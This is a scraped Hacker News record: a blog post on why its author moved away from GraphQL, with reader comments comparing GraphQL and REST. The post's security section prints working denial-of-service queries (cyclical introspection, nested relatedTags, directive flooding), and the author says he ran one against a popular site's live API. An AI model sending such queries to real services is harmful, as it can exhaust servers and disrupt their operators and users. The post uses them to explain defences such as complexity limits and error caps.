[
  {
    "id": 40521518,
    "title": "Why I'm Moving Away from GraphQL After Six Years",
    "originLink": "https://bessey.dev/blog/2024/05/24/why-im-over-graphql/",
    "originBody": "Why, after 6 years, Iâ€™m over GraphQL May 24, 2024 GraphQL is an incredible piece of technology that has captured a lot of mindshare since I first started slinging it in production in 2018. You wonâ€™t have to look far back on this (rather inactive) blog to see I have previously championed this technology. After building many a React SPA on top of a hodge podge of untyped JSON REST APIs, I found GraphQL a breath of fresh air. I was truly a GraphQL hype train member. However, as the years have gone on and I have had the opportunity to deploy to environments where non functional requirements like security, performance, and maintainability were more of a concern, my perspective has changed. In this article I would like to take you through why today, I would not recommend GraphQL to most people, and what I think are better alternatives. Throughout I will use Ruby code with the excellent graphql-ruby library for examples, but I believe many of these problems are ubiquitous across choice of language / GraphQL library. If you know of better solutions and mitigations, please do leave a comment. Now, lets beginâ€¦ Attack surface It was obvious from GraphQLâ€™s beginning that exposing a query language to untrusted clients increases the attack surface of the application. Nevertheless, the variety of attacks to consider was even broader than I imagined, and mitigating them is quite a burden. Hereâ€™s the worst Iâ€™ve had to deal with over the yearsâ€¦ Authorisation I think this is the most widely understood risk of GraphQL, so I wonâ€™t go into too much depth here. TLDR: if you expose a fully self documenting query API to all clients, you better be damn sure that every field is authorised against the current user appropriately to the context in which that field is being fetched. Initially authorising objects seems like enough, but this quickly becomes insufficient. For example, say we are the Twitter X ðŸ™„ API: query { user(id: 321) { handle # âœ… I am allowed to view Users public info email # ðŸ›‘ I shouldn't be able to see their PII just because I can view the User } user(id: 123) { blockedUsers { # ðŸ›‘ And sometimes I shouldn't even be able to see their public info, # because context matters! handle } } } One wonders how much GraphQL holds responsibility for Broken Access Control climbing to the OWASP Top 10â€™s #1 spot. One mitigation here is to make your API secure by default by integrating with your GraphQL libraryâ€™s authorisation framework. Every object returned and/or field resolved, your authorisation system is called to confirm that the current user has access. Compare this to the REST world where generally speaking you would authorise every endpoint, a far smaller task. Rate limiting With GraphQL we cannot assume that all requests are equally hard on the server. There is no limit to how big a query can be. Even in a completely empty schema, the types exposed for introspection are cyclical, so its possible to craft a valid query that returns MBs of JSON: query { __schema{ types{ __typename interfaces { possibleTypes { interfaces { possibleTypes { name } } } } } } } I just tested this attack against a very popular websiteâ€™s GraphQL API explorer and got a 500 response back after 10 seconds. I just ate 10 seconds of someoneâ€™s CPU time running this (whitespace removed) 128 byte query, and it doesnâ€™t even require me to be logged in. A common mitigation1 for this attack is to Estimate the complexity of resolving every single field in the schema, and abandon queries that exceed some maximum complexity value Capture the actual complexity of the run query and take it out of bucket of credits that resets at some interval This calculation is a delicate affair to get right. It gets particularly tricky when you are returning list fields whose length is not known prior to execution. You can make an assumption about the complexity of these, but if you are wrong, you may end up rate limiting valid queries or not rate limiting invalid queries. To make matters worse, its common for the graph that makes up the schema to contain cycles. Lets say you run a blog with Articles which each have multiple Tags, from which you can see associated Articles. type Article { title: String tags: [Tag] } type Tag { name: String relatedTags: [Tag] } When estimating the complexity of Tag.relatedTags, you might assume that an article will never have more than 5 tags, so you set this fields complexity to 5 (or 5 * its childrenâ€™s complexity). The problem here is that Article.relatedTags can be its own child, so your estimateâ€™s inaccuracy can compound exponentially. The formula is N^5 * 1. So given this query: query { tag(name: \"security\") { relatedTags { relatedTags { relatedTags { relatedTags { relatedTags { name } } } } } } } You expect a complexity of 5^5 = 3,125. If an attacker is able to find an Article with 10 tags, they can trigger a query with a â€œtrueâ€ complexity of 10^5 = 100_000, 20x greater than estimated. A partial mitigation here is to prevent deeply nested queries. However, the example above demonstrates that this is not really a defense, as itâ€™ts not an unusually deep query. GraphQL Rubyâ€™s default maximum depth is 13, this is just 7. Compare this to rate limiting a REST endpoint, which generally have comparable response times. In this case all you need is a bucketed rate limiter that prevents a user exceeding, say, 200 requests per minute across all endpoints. If you do have slower endpoints (say, a CSV report or PDF generator) you can define more aggressive rate limits for these. With some HTTP middleware this is pretty trivial: Rack::Attack.throttle('API v1', limit: 200, period: 60) do |req| if req.path =~ '/api/v1/' req.env['rack.session']['session_id'] end end Query parsing Before a query is executed, it is first parsed. We once received a pen-test report evidencing that its possible to craft an invalid query string that OOMâ€™d the server. For example: query { __typename @a @b @c @d @e ... # imagine 1k+ more of these } This is a syntactically valid query, but invalid for our schema. A spec compliant server will parse this and start building an errors response containing thousands of errors which we found consumed 2,000x more memory than the query string itself. Because of this memory amplification, its not enough to just limit the payload size, as you will have valid queries that are larger than the the smallest dangerous malicious query. If your server exposes a concept of maximum number of errors to accrue before abandoning parsing, this can be mitigated. If not, youâ€™ll have to roll your own solution. There is no REST equivalent to this attack of this severity. Performance When it comes to performance in GraphQL people often talk about itâ€™s incompatibility with HTTP caching. For me personally, this has not been an issue. For SaaS applications, data is usually highly user specific and serving stale data is unacceptable, so I have not found myself missing response caches (or the cache invalidation bugs they causeâ€¦). The major performance problems I did find myself dealing with wereâ€¦ Data fetching and the N+1 problem I think this issue is pretty widely understood nowadays. TLDR: if a field resolver hits an external data source such as a DB or HTTP API, and it is nested in a list containing N items, it will do those calls N times. This is not a unique problem to GraphQL, and actually the strict GraphQL resolution algorithm has allowed most libraries to share a common solution: the Dataloader pattern. Unique to GraphQL though is the fact that since it is a query language, this can become a problem with no backend changes when a client modifies a query. As a result, I found you end up having to defensively introduce the Dataloader abstraction everywhere just in case a client ends up fetching a field in a list context in the future. This is a lot of boilerplate to write and maintain. Meanwhile, in REST, we can generally hoist nested N+1 queries up to the controller, which I think is a pattern much easier to wrap your head around: class BlogsController 1 language across the server and clients2 You are probably better off exposing an OpenAPI 3.0+ compliant JSON REST API. If, as in my experience, the main thing your frontend devs like about GraphQL is its self documenting type safe nature, I think this will work well for you. Tooling in this area has improved a lot since GraphQL came on the scene; there are many options for generating typed client code even down to framework specific data fetching libraries. My experience so far is pretty close to â€œthe best parts of what I used GraphQL for, without the complexity Facebook neededâ€. As with GraphQL thereâ€™s a couple of implementation approachâ€¦ Implementation first tooling generates OpenAPI specs from a typed / type hinted server. FastAPI in Python and tsoa in TypeScript are good examples of this approach3. This is the approach I have the most experience with, and I think it works well. Specification first is equivalent to â€œschema firstâ€ in GraphQL. Spec first tooling generates code from a hand written spec. I canâ€™t say Iâ€™ve ever looked at an OpenAPI YAML file and thought â€œI would love to have written that myselfâ€, but the recent release of TypeSpec changes things entirely. With it could come a quite elegant schema first workflow: Write a succinct human readable TypeSpec schema Generate an OpenAPI YAML spec from it Generate statically typed API client for your frontend language of choice (e.g. TypeScript) Generate statically typed server handlers for your backend language & server framework (e.g. TypeScript + Express, Python + FastAPI, Go + Echo) Write an implementation for that handler that compiles, safe in the knowledge that it will be type safe This approach is less mature but I think has a lot of promise. To me, it seems like powerful and simpler options are here, and Iâ€™m excited to learn their drawbacks next ðŸ˜„. Persisted queries are also a mitigation for this and many attacks, but if you actually want to expose a customer facing GraphQL API, persisted queries are not an option. â†© Otherwise a language specific solution like tRPC might be a better fit. â†© In Ruby, I guess because type hints are not popular, there is no equivalent approach. Instead we have rswag which generates OpenAPI specs from request specs. It would be cool if we could build an OpenAPI spec from Sorbet / RBS typed endpoints! â†©",
    "commentLink": "https://news.ycombinator.com/item?id=40521518",
    "commentBody": "After 6 years, I'm over GraphQL (bessey.dev)647 points by mattbessey 10 hours agohidepastfavorite453 comments joshstrange 2 hours agoI bought into the hype and I feel bad for the company where I implemented it. One true endpoint to rule them all and cause endless headaches in the process. With most tech that I screw up I assume that \"I wasn't using it right\" but with GraphQL I'm not sure how anyone could. The permissions/auth aspect alone is a nightmare. Couple that with potential performance issues (N+1 or just massive amounts of data) and I want nothing to do with GraphQL anymore. Everything we attempted to fix our permissions issues just caused more problems. It would break existing queries and debugging GraphQL sucked so much. If you only live on the frontend and someone else is responsible for the backend GraphQL then I understand why you might like it. From that perspective it's amazing, you can get as little or as much as you want with the specific fields you want. No waiting on the backend team to write an endpoint. However even then you end up saving queries as files or abstracting them (maybe IDE support has improved but it wasn't great last time I was using it ~5 years ago) and now you just have REST endpoints by another name. At one point we considered whitelisting specific queries and that's when I knew we had gone too far and made a mess for ourselves. If we had taken the time to just write REST endpoints instead we would have gotten way more done and had way fewer grey hairs. reply burutthrow1234 1 hour agoparentGraphQL absolutely feels like a technological solution to an organizational problem. What if your front-end team wants to write crazy queries and your back-end team wants to build their resume doing Real Engineering, but what you actually need is just a CRUD app? Now your backend devs aren't bored writing \"business logic\" and your front end devs aren't bored waiting for your backend devs. You have a new class of inscrutable errors and performance issues, but that's why you pay your backend devs the big bucks! Because some guys from a technical college couldn't possibly solve your issue, you need to pay 250k to people who went to Stanford or Berkeley. reply jack_riminton 1 hour agorootparentYep, Conwayâ€™s Law: â€œ Any organization that designs a system will inevitably produce a design that mirrors the organization's communication structure. â€œ Your point about ResumÃ© Driven Development, together with the dividing wall between front and backends is why FE frameworks have got so hideously and needlessly complex imo reply giantg2 1 hour agoparentprevMy biggest problem is that it seems like nobody understands the data or where the data is coming from. You can have the same variable names and mostly even the same values under different levels of the graph. Now someone has to figure out what system is feeding that info to GraphQl to figure out which level we should use. I don't see this as a real GraphQl problem, but more so a problem with the process discouraging detailed knowledge and documentation. reply hosh 1 hour agoparentprevHmm. I wonder if there is some kind of query builder that can live server-side. That is, capture the flexibility of a query language when developing, and then consolidating that when going into production. Though I guess you can do that with REST too. I'm currently exploring all of this myself. I have a side project in mind that can use a graph db, and I thought a front-end graphql can work well with a graphdb backend. I was not sure why this pattern is not more popular, but reading all of this now, I'm seeing where these problems may arise. A graph db backend can use efficient graph search algorithms, especially for deeply nested data, but the issue with authorization is still there. If anything, fine-grained authorization is something better represented with graph dbs than with relational databases. reply AaronFriel 1 hour agorootparentThis is a vague recollection, but I seem to recall Meta/Facebook engineers on HN having said they have a tool that allows engineers to author SQL or ORM-like queries on the frontend and close to where the data is used, but a compiler or post-processor turns that into an endpoint. The bundled frontend code is never given an open-ended SQL or GraphQL interface. And perhaps not coincidentally, React introduced \"server actions\" as a mechanism that is very similar to that. Engineers can author what looks, ostensibly, like frontend code, merely splitting the \"client\" side and \"server\" side into separate annotated functions, and the React bundler splits those into client code, a server API handler, and transforms the client function call into the annotated server function into an HTTP API call. Having used it for a bit it's really nice, and it doesn't result in yielding so much control to a very complex technology stack (GraphQL batchers, resolvers, etc. etc.) reply nkozyra 1 hour agorootparentprev> Hmm. I wonder if there is some kind of query builder that can live server-side. That is, capture the flexibility of a query language when developing, and then consolidating that when going into production. I think this is what a lot of people end up doing (and yes, with REST). Translating options via query params / POST body into a query. In theory GraphQL was supposed to mitigate this DSL-like translation, but the thing is people like flexibility and ability to change and, yes, break backwards compatibility. That's also why a lot of people end up with a translation layer with things like RPC, which is itself supposed to be a direct, shared communication protocol. The messiness of APIs is often a feature, at least internally. These approaches that attempt to avoid the mess are better for the end consumer but cause friction within development groups and the benefits are often obscured. reply lcnmrn 1 hour agoparentprevSomeone like you made me quit my first job as developer. He implemented a Clojure + GraphQL nightmare. reply nfw2 38 minutes agoparentprevWhitelisting the queries that clients can use in prod actually doesn't seem like a bad option to avoid a lot of these security issues, assuming you control the clients reply teaearlgraycold 33 minutes agoparentprevI think a lot of people like GraphQL because it provides strongly typed API interfaces. But I've been able to hack together a better REST alternative in full-stack typescript codebases. And my solution doesn't need to compile any kind of client or intermediary. reply atsjie 8 hours agoprevWorked on two GraphQL projects; I was quickly cured from the hype. I recognize a lot of points in this article. In both these projects the GraphQL had started small. I came in during a more mature phase of these projects (2 and 4 years). That's where the requirements are harder, more specific, and overall complexity has grown. Adoption and demand on the API were growing quickly. Hence you logically spend more time debugging, this is true for any codebase. But GraphQL has everything in it to make such problems even harder. And both these projects had clear signs of \"learning-on-the-go\" with loads of bad practices (especially for the N+1 problem). Issue descriptions were much vaguer, harder to find in logs and performance issues popped up in the most random places (code that had been running and untouched for ages). Fun fact; in both these projects the original devs who set it up were no longer involved. Probably spreading their evangalism further elsewhere. RPC and REST are just more straightforward to monitor, log, cache, authorize and debug. reply matt_s 5 hours agoparent> RPC and REST are just more straightforward to monitor, log, cache, authorize and debug. REST API's are a proven solution for the problem of other apps, including front-ends, needing data from a data store. Using JSON is much improved over the days of XML and SOAP. Beyond that there haven't been advancements in technology that cause fundamental shifts in that problem space. There have been different opinions about structuring REST calls but those aren't going to cause any real forward progress for the industry and are inconsequential when it comes to business outcomes. There are so many developers out there that can't stand plugging in proven solutions to problems and just dealing with the trade-offs or minor inconveniences. Nothing is going to be perfect and most likely a lot of the software we write will cease to be running in a decade. reply hansonkd 5 hours agorootparentREST APIS suck for nested resources. GraphQL is a huge breakthrough in managing them. Ever seen an engineer do a loop and make n+1 REST calls for resources? It happens more often then you think because they don't want to have to create a backend ticket to add related resources to a call. With internal REST for companies I have seen so many single page specific endpoints. Gross. > There have been different opinions about structuring REST calls but those aren't going to cause any real forward progress for the industry and are inconsequential when it comes to business outcomes. You could argue almost any tech solution in a non-pure tech play is largely in consequentially as long as the end goal of the org is met, but managing REST APIS were a huge point of friction at past companies. Either it goes through a long review process to make sure things are structured \"right\" (ie lots of opinions that nobody can sync on) or people just throw up rest endpoints willynilly until you have no idea what to use. GraphQL is essentially the \"Black\" for Python Syntax but for Web APIs. Ever seen engineers fight over spaces vs tabs, 8 vs 4 spaces, whether a space before a colon? those fights happened a lot and then `black` came out and standardized it so there was nothing to fight over. GraphqL makes things very clear and standard, but can't please everyone. reply kiney 4 hours agorootparentUnpopular opinion: I'm actually a fan of singe page specific endpoints. You get much easier debugging, easier to audit security, easier performance optimization an the imho pretty small price to pay is that it's \"not elegant\" and a bit of backend code reply WD-42 4 hours agorootparentYup. Especially when your api really only has 1 (possibly 2 in the case of a mobile app) real clients. People like to pretend their apis are generic but they arenâ€™t. Thereâ€™s a good argument to stop writing generic apis for your single application. reply hansonkd 3 hours agorootparentTypically the endpoints clients are multiple frontend developers. If the frontend is blocked for every page they need waiting on the backend to expose data that massively increases the costs of features and reduces the time for delivery. reply bunderbunder 2 hours agorootparentThis sounds like more of an org chart problem or a value chain management problem than a technical problem. reply throwup238 2 hours agorootparentThat's why we have Conway's law. reply bunderbunder 6 minutes agorootparentYeah. And a gentle nudge that Conway's Law is about lines of communication in general, not specifically the org chart. I used to be in charge of the stored procedures that served as the API to a shared database system used by many teams. (So, not exactly the same thing, but I'd argue that the sprocs vs ORM debate isn't entirely dissimilar from the REST/RPC vs GraphQL debate.) My turnaround time for getting database API changes into staging for application teams to play with was typically less than one work day. But that happened because I had a lot of latitude to just get things done, because the company valued rapid delivery, and therefore made sure we had what we needed to deliver things rapidly, both from a technical and a business process perspective. This was in a very highly regulated industry where every change required paperwork that would be audited by regulators, too. I've also worked at places where this sort of thing took ages. Typically the worst places for work backing up were organizations that used Scrum, because the whole \"sprints\" thing meant that the _minimum_ time to get something from another team was about 1.5 times the sprint duration, and even then you could only manage that if you could deliver a request that already met all of that particular team's requirements for being able to point it, and could convince their Product Owner that it was a higher priority than whatever their pet project is this quarter, and the stars align so that you perfectly time the submission of your request with respect to that team's Scrum process' frame rule. The thing I want to point out here is that absolutely none of that bullshit was ever the API technology's fault. WD-42 3 hours agorootparentprevThis happens anyway. reply hansonkd 3 hours agorootparentNot nearly as often with Graphql and happens less and less as your backend and data models stabilizes. Most of our frontend features now don't have backend changes and we were able to increase the ratio of frontend to backend devs. reply blowski 2 hours agorootparentMy experience is that the problem is avoided in theory, but not in practice. Making a good API on a large system with many clients is always difficult. GraphQL makes it easier in theory, but if you have average level devs working on it, theyâ€™ll make a bigger mess than if they use simple REST. The latter will still be complex, but at least itâ€™s easier to have observability. reply ethbr1 2 hours agorootparentAka never underestimate the power of additional complexity to drive bad use, absent familiarity. reply eddd-ddde 54 minutes agorootparentprevThis is the true purpose of REST. If you need to make multiple requests for a single operation you don't have enough endpoints. The idea that resources and the underlying data needs to map 1-1 is wrong. reply marcosdumay 2 hours agorootparentprevThe modern web development practices are just insane. The GP's idea that a frontend developer would send a ticket to somebody so they can get all the data they need... it's just crazy. On the other extreme, we have the HTTP 1.0 developers saying something like \"networks are plenty of fast, we can waste a bit of it with legible protocols that are easier to make correct\", while the HTTP 2.0 ones are all in \"we must cram information into every single bit!\" Every place you look, things are completely bananas. reply klibertp 2 hours agorootparent> idea that a frontend developer would send a ticket to somebody so they can get all the data they need... it's just crazy. For me, what's crazy is that there are \"web\" developers who can't just add the endpoint they need while working on a frontend feature, or \"web\" developers who can't just add an element or a page for testing the backend endpoint. What ever happened to full-stack developers? The \"frontend\" and \"backend\" developer split is so incredibly inefficient that it's really jarringâ€”you take something that should take 2 hours and magically, through tickets, delegation, and waiting for results (then repeat that for debugging, who knows how many times!), make it into a 2-3 day task. I once reproduced (black-box style!) a two-week effort by a three-man team in six hours of work simply because I had PyCharm and IDEA opened side-by-side and could write code on both sides at the same time. If someone has a good explanation for why the full-stacks that were once the norm went almost extinct, I'd be happy to give it a read! reply riffraff 2 hours agorootparentBecause people have a limited appetite for complexity. I wrote some front-end stuff back in the days but I've lost track of whatever is happening these days. jQuery to append some stuff took five minutes to learn, but learning react hooks takes a determined effort. Likewise, adding a field to a graphql type is simple, but doing it with authorization, controlling n+1s, adding tests etc.. requires front-end folks to actually invest time in learning whatever back-end they're dealing with this time. Everything is just a lot more complicated these days, and if you've been around for a while you may not be excited anymore by the churn, but rather fed up. reply jack_riminton 52 minutes agorootparentThis is why the Rails community should be applauded in my book, for their dogged determination that we should keep it a â€œone personâ€ framework. Yes it may not be as performant, type safe or flashy on the front end but my god itâ€™s productive. At my startup there are 7 devs who can all do tickets across the stack and as we grow I think it would be good if we could resist the pressure to silo and specialize reply defen 47 minutes agorootparentprevMany organizations would rather pay 3 people $120,000 each instead of paying 1 person $300,000 to do the same work, for a variety of reasons. Some good, some bad. reply evantbyrne 43 minutes agorootparentprevMicroservice architectures and the associated explosion in complexity on both ends are to blame. When it takes twice the time to build something, it is natural to hire twice as many developers. Increased complexity drives specialization. reply marcosdumay 1 hour agorootparentprevIf you absolutely need 2 people for that, they should be side by side. But yes, that break-down of the problem is insane. People artificially split an atomic problem in two, and go create all of that extra craziness to try to solve the communication problem they made. And then people go and push UX and UI tasks into the frontend developer, and ops tasks on the backend since them are there... What is insane again, because those are really incompatible tasks that can't be done with the same mindset. And since it's standard, backend tools won't support the frontend and the other way around. So the insanity gets frozen on our tooling. reply GeneralMaximus 1 hour agorootparentprevFor context: I work on large-scale browser apps that are closer in complexity to something like Linear or Obsidian than to your standard WordPress blog with some forms. E.g I'm currently working on a browser-based GIS tool for the financial sector. I started my career as a full-stack developer, but went all-in on frontend because I felt I was spreading myself too thin. At one point I found that I could choose to be almost good enough at doing two different things or extremely good at one thing. I chose the latter option. Modern browser apps are complex beasts, at least if you want to do them right. You obviously have to worry about all the technical bits --- HTML, CSS, JavaScript, your view library of choice, platform APIs likeand WebAudio, cross browser testing, bundle sizes, performance optimizations, techniques like optimistic rendering, all that good stuff. On top of that, you also need to work closely with designers to make sure they know the features and limitations of the platform(s) they're designing for. More often than not, you end up being a sort of bridge between the backend devs, designers, and product managers. A lot of times you end up doing design too, whether you like it or not. I've learned a lot about UI/UX design just because I often have to fill in the gaps where a designer forgot to include a certain error state, or didn't test their design on tablet screens, or didn't account for cases where a certain API might not be available. I tried for many years to learn as much as I could about Django as well as React and friends. But it eventually got too much. I found that I wasn't able to keep up with both ecosystems, and I was producing code that wasn't very good. I could certainly build things quickly because I was familiar with all parts of the stack, but it came at the cost of code quality, security, stability, and robustness. I eventually decided to hang up my backend developer hat and focus exclusively on what goes on inside the browser (which can be a lot by itself these days!) It's probably possible for a single individual to build a high-quality server-rendered MPA with some forms without making a mess of it. But that says more about how good Rails/Django/Laravel are than about the capabilities of any single individual. I don't think a single person could build a product like Linear end-to-end without cutting corners. reply evantbyrne 58 minutes agorootparentI don't think the claim is that a single developer should be able to build an entire enterprise product, but rather that a single developer should be able to implement the software side of a task end-to-end. The latter is a reasonable expectation when your software is monolithic. reply int_19h 1 hour agorootparentprevIMO the fact that being a full-stack dev is so taxing is an indication that the stack as a whole is just way too complex and overengineered. Which is rather obvious from looking at the state of affairs on the frontend side of things. Desktop GUI devs don't usually have those problems. reply apsurd 1 hour agorootparentprev> ... I don't think a single person could build a product like Linear end-to-end without cutting corners. Cutting corners is a feature. I bet the Linear team is as pained as any, internally, at the tradeoffs they're making. There is no way to know \"what to get right\" without going through it. So for 80% of the dev cycle the job is to cut corners to get to the 80/20, rinse and repeat forever. This isn't against excellence and the dream of a beautiful product experience as your reply seems to convey. reply nurple 4 hours agorootparentprevI think it's elegant. I loved MVVM in the postback world, and with SPAs, I see view-specific endpoints as the view-model continuing to reside on the server while the view was split off to the client-side. reply blowski 3 hours agorootparentprevIâ€™ve heard this called the â€œbackend-for-frontendâ€ pattern. reply datavirtue 4 hours agorootparentprevAgreed. Specific endpoints. I was on a project recently where a 40+ yr old dev was going crazy over \"pure REST.\" It's embarrassing. Sure, have your pure REST but FFS create specific endpoints if you they make sense. reply mgkimsal 4 hours agorootparentYou are literally Transferring the REpresented State of a given page/view/screen. Screen-specific REST endpoints will make their way as a default in to a JS-based framework in 2025 and people will pretend like this is some breakthrough advancement. reply mjburgess 3 hours agorootparentAnd finally HyperText will progress into the futuristic HyperCard reply WorldMaker 16 minutes agorootparentprev> Ever seen an engineer do a loop and make n+1 REST calls for resources? It happens more often then you think because they don't want to have to create a backend ticket to add related resources to a call. With REST, though, that pain is visible to both sides. Frontend engineers generally don't want to make N+1 REST calls in a tight loop; it's a performance problem that they see and that is very visible in their Dev Tools. Backend engineers with good telemetry may not know why they get the bursts of N+1 calls that they see without asking the Frontend or digging into Frontend code, but they can still see the burstiness of the calls and have some idea that something could be optimized, that something is maybe too chatty. There are multiple ways with REST to handle things: pagination, \"transclusions\", hyperlinks, and more. Certainly \"single page endpoints\" is a way as well, no matter how gross it is from REST theory, it's still a pragmatic solution for many in practice. REST certainly can please everyone, given pragmatic compromises, even if it isn't very clear or standard. reply ComputerGuru 4 hours agorootparentprev> With internal REST for companies I have seen so many single page specific endpoints. Gross. Hardly gross. It is what it is and itâ€™s universal across the domain. I bet Windows has internal APIs or even external ones that were created just for one page/widget/dialog of one app. Itâ€™s the nature of things at times. reply datavirtue 4 hours agorootparentIt's analogous to a specific method in code. No idea why people go nuts over this. reply arp242 2 hours agorootparentSome people treat codebases as an art project rather than engineering project. I think this explains about three quarters of all engineering problems I've seen in corporate context, give or take. reply hansonkd 3 hours agorootparentprevA REST endpoint can be analogous to a specific method in code. just as much as a GraphQL field. What people are excited about is that the frontend can request all the data it needs at once and the backend can efficiently serve it. Something not possible with REST without reimplementing something similar to GraphQL. reply hansonkd 4 hours agorootparentprevIts gross because it is a waste. An engineer had to spend time to make that specific API for that page instead of the frontend consumer using what was already defined and get all the resources with one call and 0 backend engineer needed for that new page. reply pavel_lishin 4 hours agorootparentOn the other hand, it may take that engineer less time to create a page-specific endpoint than it would be to create something more generic that might serve other purposes (that may never come to pass), which may also involve talking to other teams, checking what future plans are, etc. And that's assuming it's a new endpoint; if there's an existing endpoint that does almost what's necessary, they may need to check in with that team about what modifications to the endpoint would be acceptable, etc. Single-page endpoints aren't great, but often times they're acceptable because they end up being a half-day task instead of a week-long slog. reply RVuRnvbM2e 3 hours agorootparentprevThat backend engineer wrote a single SQL query that joined some tables, ensured indices were used, and always executed inWhat? GraphQL is purpose built to solve that in 1 Query. Not doing it in 1 query is on you not the protocol. 1 graphql query maybe. But that translated to a dozen SQL queries. > In practice with REST the frontend engineer didn't want to wait and tried to use the existing REST endpoints, did N+1 API HTTPS calls and then joined them client side in javascript. The point you're missing is that for 1 graphql query the API did N+1 SQL queries, and then also joined them in JavaScript. In the REST case the front end can switch to the efficient custom endpoint when it is implemented. In the graphql case it will never get any faster because the API has to stay generic. reply fiddlerwoaroof 3 hours agorootparentprevA lot of graphql implementation end up moving the n+1 problem to the query resolver. reply hansonkd 3 hours agorootparentEvery GQL implementation I have seen explicitly has a way to avoid n+1 queries. reply clintonb11 4 hours agorootparentprevIs the flexibility worth the tradeoffs? Maybe in a company where you are adding new pages all the time with deeply nested relational data needs. But I would argue this is more rare than not. And I often find that frontend engineers arenâ€™t as familiar with database queries and the load they are putting on the system with some of the graphql queries they are making. Flexibility for frontend has its own tradeoffs and I totally understand why a frontend engineer doesnâ€™t want to have to wait for an endpoint to be finished. But this article outlines some of the issues you encounter later as you scale your team and system. We use a schema first design where I am at and if a frontend person needs a new endpoint because the resource-only endpoints arenâ€™t enough then they submit a pull request to the schema repo with a design for their endpoint they need. It gets approved and boilerplate is auto generated. Yes you have to wait longer, but 90% of the time (for our software) the resource endpoints work great. reply hansonkd 4 hours agorootparentSorry what are the tradeoffs? I'm not sure where this narrative comes from that GraphQL immediately means that the frontend time will have no idea what they are doing and will induce load on the system. 95% of my nested graphql fields are based on foreign key indexes so its almost no additional load to the system (only 1 query per \"level\" of GraphQL) to query the nested objects. I restrict GraphQL to 5 levels and now I have 5 queries per API call instead of 5 Queries over 5 API calls. The backend team exposes the fields that they know are efficient to query. They can restrict the depth of the GraphQL, number of fields, etc. reply arp242 2 hours agorootparentprevThis is like, an hour per endpoint. For maybe 30 endpoints (high figure for many apps) throughout the lifespan of your application. But let's say 3 hours: you're talking about 90 hours in total, over a period of 2 or more years. It's really not that much. And GraphQL isn't free either; you need to actually implement that. It pervades your entire stack, too â€“ it's not something you can just \"put on top of it\". I think that in many cases, perhaps even most, GraphQL is a \"spend 8 hours to automate a half hour task\" kind of affair. Are there cases where that's not the case? Probably. Maybe your specific use case is one of them. But for the general case? I'm entirely unconvinced. reply hansonkd 1 hour agorootparentAn experience engineer knows that a change that takes hour turns to days when a team is running at scale and needs to have CI approvals etc. Why waste any time? > And GraphQL isn't free either; you need to actually implement that Rest isn't free. You have to actually implement also that and end up with a more limited API. GraphQL libs in Python are equally as complex as the FastAPI etc.. reply arp242 58 minutes agorootparentAnd no one will be spending days working on it, they will work on other things while waiting for code reviews and such. > GraphQL libs in Python are equally as complex as the FastAPI etc. You need to account for the fact that anything can query anything, whereas a more traditional REST-type API will have much more limited codepaths. This starts with just basic database maintenance and indexing, which in many case will be significantly more complex, to all sorts of other problems. This article already enumerates them so I'm not going to repeat them here. You can't just handwave all of that away with \"oh there's a library you can use\". If you think all of that is worth it then that's fine. As with many things it's a trade-off, and a bit of a judgement call too. But please, don't pretend this complexity doesn't exist, and that the trade-off doesn't exist. reply matt_s 1 hour agorootparentprevIf an app's API requires more than a couple of nested structures then, without knowing the specifics of the domain, I would venture a guess at a poorly defined data model is the issue vs. API technology. For example, a lot of times people build out nice normalized table structures for online transactional apps. The UI/UX is pretty straight forward because end users typically only CRUD an object maybe a couple nested objects at a time. The API's are straight forward as well, likely following single responsibility principles, etc. Then comes along requirements to build UI's for analytics and/or reporting types of things where nearly the entire schema is needed depending on what the end user wants to do. Its the wrong data model for doing those types of things. What should be done is ETL the data from the OLTP schema into a data warehouse style schema where data is de-normalized so that you can build reporting, etc. reply karmakaze 4 hours agorootparentprevOne place I was at we used REST with a hydration service that ran as a proxy in front of the requests. That gave us most of the benefits of GraphQL and we only implemented it for the main resources (users, photos, and maybe one other thing). To minimize latency/faults the hydration service ran locally on every webapp/API server. I wasn't around for far too long after though to see how it turned out as it grew (if it did at all, the company sort-of went defunct--development-wise anyway). I also recall, we had similar N+1 query problems in the REST API endpoints irrespective of hydrating the returned resources. The biggest benefit of GraphQL I can see from a user perspective is that it lowers total latency especially on mobile with fewer round trips. reply bernawil 3 hours agorootparentyou don't think it's a benefit that you could get the benefits of a \"hydration service that ran as a proxy in front of the requests\" out of the box? there's lots of other benefits for GQL: multiple queries per request, mutation/query separation, typed errors, subscriptions support. reply theptip 4 hours agorootparentprevThe canonical REST solution of query params to add nested fields gets you quite far: GET /myresource?extra=foo,bar sure you over fetch a bit if you have multiple accessors. But agreed, if you have highly nested data especially when accessed with multiple different query purposes then REST might not be the best fit. I think GraphQL has been positioned as a general purpose tool and for that I am with the author, REST is a better go-to for most usecases. reply hansonkd 4 hours agorootparentI guess depending on the context of a simple app one level could be viewed as far. Any more levels and you have now reinvented GraphQL reply WorldMaker 1 hour agorootparentOData existed before GraphQL in the wild, it's possible to suggest GraphQL reinvented OData. https://www.odata.org/ reply hansonkd 1 hour agorootparentThe point is GQL is currently the standard for querying dynamic nested data shapes not that it is the first or was the first. Look at OData download stats on Pypi it had 2 downlaods the last day. Graphql-core for python? 624,201. that is not even on the same planet. If you don't use GQL and want a system of querying nested data you will be using a less used protocol that is analogous to GQL so you might as well use the standard. reply WorldMaker 10 minutes agorootparentOData is still currently a standard for querying (among other things) nested data shapes. The point was it is a matter of fact that as a standard it predates GraphQL and as a matter of ecosystem perspective whether or not you think it is a more or less used protocol. To trade anecdotes for anecdotes: On Nuget, the Microsoft.Data.OData package marked deprecated and marked with CVEs for critical bugs still has an average of 36.3K per day downloads. (Its successors combine for about double that.) The top GraphQL library (of the same name, unadorned) still only has 9.3K per day downloads. In .NET if you want a system of querying nested data, why would you use a less used protocol like GraphQL? billisonline 1 hour agorootparentprev> Ever seen an engineer do a loop and make n+1 REST calls for resources? It happens more often then you think because they don't want to have to create a backend ticket to add related resources to a call. > With internal REST for companies I have seen so many single page specific endpoints. Gross. As someone pointed out in reply to another comment, GraphQL is \"a technological solution to an organizational problem.\" If that problem manifests as abuse of REST endpoints, you can disguise it with GraphQL, until one day you find out your API calls are slow for more obscure, harder to debug reasons. reply realusername 4 hours agorootparentprev> With internal REST for companies I have seen so many single page specific endpoints. Gross. Single page endpoints is exactly what you want if you have more than 5 engineers in your company anyways. It ensures that the endpoints are maintainable and future-proof when people are working on different features. reply hansonkd 3 hours agorootparent> It ensures that the endpoints are maintainable and future-proof when people are working on different features How does GQL prohibit this? It encourages it by focusing on 1 stable API for everyone instead of a custom API 